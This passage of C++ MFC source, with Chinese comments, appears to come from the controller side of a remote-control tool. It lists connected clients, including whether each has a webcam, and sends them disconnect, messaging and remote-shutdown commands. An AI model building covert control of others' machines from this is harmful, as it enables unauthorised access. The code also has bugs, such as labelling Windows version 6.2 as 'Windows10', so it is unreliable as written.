	case WM_RBUTTONDOWN:
	{

		//动态加载菜单
		CMenu Menu;
		Menu.LoadMenu(IDR_NOTIFY_ICON_DATA_MENU);
		CPoint Point;  //x y
		GetCursorPos(&Point); //获得鼠标位置   
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			Point.x, Point.y, this, NULL);

		break;
	}
	}
}


void CServerPojectDlg::OnShowMainDialog()
{
	// TODO: 在此添加命令处理程序代码
	if (!IsWindowVisible())  //当前主对话框是否是显示状态
	{
		//窗口不显示
		ShowWindow(SW_SHOW);
	}
}


void CServerPojectDlg::OnHideMainDialog()
{
	// TODO: 在此添加命令处理程序代码
	if (IsWindowVisible())  //当前主对话框是否是显示状态
	{
		//窗口不显示
		ShowWindow(SW_HIDE);
	}
}





LRESULT CServerPojectDlg::OnClientLogin(WPARAM ParameterData1, LPARAM ParameterData2)   //自定义消息函数
{

	//将解压后的数据集进行界面展示
	CString ClientAddress, ClientPosition, HostName, ProcessorName, IsWebCameraExist, WebSpeed, OsName;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)ParameterData2;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据
	if (ContextObject == NULL)//解压出来的数据
	{
		return -1;
	}
	CString	v1;
	try
	{
		int v20 = ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength();
		int v21 = sizeof(LOGIN_INFORMAITON);
		if (ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() != sizeof(LOGIN_INFORMAITON))
		{
			return -1;
		}
		LOGIN_INFORMAITON* LoginInfo =
			(LOGIN_INFORMAITON*)ContextObject->m_ReceivedDecompressedBufferData.GetArray();
		sockaddr_in     v2;
		memset(&v2, 0, sizeof(v2));

		//分析客户端的IP地址
		int v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//主机名称
		HostName = LoginInfo->HostName;

		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
			{
				OsName = "WindowsNT";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OsName = "Windows2000";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OsName = "WindowsXP";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OsName = "Windows2003";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OsName = "WindowsVista";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OsName = "Windows7";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OsName = "Windows10";
			}

		}
		//CPU
		ProcessorName = LoginInfo->ProcessorName;
		//网速
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "有" : "无";


		//数据分析

		//向控件添加数据
		AddClientInfo(ClientAddress, ClientPosition,
			HostName, OsName, ProcessorName,
			IsWebCameraExist, WebSpeed, ContextObject);    //最后一个参数 不显示 为了Socket
		//ContextObject 是放在控件中的隐藏项中
	}
	catch (...) {}

}



VOID CServerPojectDlg::AddClientInfo(CString ClientAddress, CString ClientPosition,
	CString HostName,
	CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
	CString WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	//默认为0行  这样所有插入的新列都在最上面
	int i = m_ClientInfoList.InsertItem(m_ClientInfoList.GetItemCount(),
		ClientAddress);//客户端Ip地址
	m_ClientInfoList.SetItemText(i, 2, HostName);
	m_ClientInfoList.SetItemText(i, 3, OsName);
	m_ClientInfoList.SetItemText(i, 4, ProcessorNameString);
	m_ClientInfoList.SetItemText(i, 5, IsWebCameraExist);
	m_ClientInfoList.SetItemText(i, 6, WebSpeed);

	m_ClientInfoList.SetItemData(i, (ULONG_PTR)ContextObject);  //插入到该排的隐藏区  删除

	ShowMainDlgInfo(TRUE, ClientAddress + "主机上线");
}

void CServerPojectDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (m_StatusBar.m_hWnd != NULL)                         //状态栏
	{
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
	}
}


void CServerPojectDlg::OnNMRClickClientInformationList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码


	CMenu Menu;
	Menu.LoadMenu(IDR_CLIENT_INFO_LIST_MENU);
	CPoint Point;  //x y
	GetCursorPos(&Point); //获得鼠标位置   
	Menu.GetSubMenu(0)->TrackPopupMenu(
		TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL);



	*pResult = 0;
}


void CServerPojectDlg::OnDeleteClientInfo()
{
	// TODO: 在此添加命令处理程序代码


	//发送数据到客户端
	BYTE IsToken = CLIENT_GET_OUT_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));   //构建客户端数据包

	//清除ListControl列表
	CString  ClientAddress;
	int SelectedCount = m_ClientInfoList.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_ClientInfoList.GetFirstSelectedItemPosition();
		int Item = m_ClientInfoList.GetNextSelectedItem(Position);
		ClientAddress = m_ClientInfoList.GetItemText(Item, 0);   //第几排  第0列
		//销毁列表项
		m_ClientInfoList.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowMainDlgInfo(TRUE, ClientAddress);
	}



}


void CServerPojectDlg::OnInstantMessaging()
{
	// TODO: 在此添加命令处理程序代码

	BYTE IsToken = CLIENT_REMOTE_MESSAGE_REQUIRE;			//消息为客户端请求发送通信
	SendingSelectedCommand(&IsToken, sizeof(BYTE));			//发送消息
}


void CServerPojectDlg::OnRemoteShutdown()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_SHUT_DOWN_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	CString  ClientAddress;
	int SelectedCount = m_ClientInfoList.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_ClientInfoList.GetFirstSelectedItemPosition();
		int Item = m_ClientInfoList.GetNextSelectedItem(Position);
		ClientAddress = m_ClientInfoList.GetItemText(Item, 0);
		m_ClientInfoList.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowMainDlgInfo(TRUE, ClientAddress);
	}
}






//将数据包发送至客户端
VOID CServerPojectDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{

	//从ListControl上的隐藏项中选取中Context
	POSITION Position = m_ClientInfoList.GetFirstSelectedItemPosition();
	//该代码支持多项选择
	while (Position)
	{
		int	Item = m_ClientInfoList.GetNextSelectedItem(Position);
		//获得该排的隐藏数据项得到Context
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_ClientInfoList.GetItemData(Item);   //上线显示的函数中插入一个Context隐藏数据

		//通信类负责发送数据
		m_IocpServer->OnPrepareSending(ContextObject, BufferData, BufferLength);

	}
}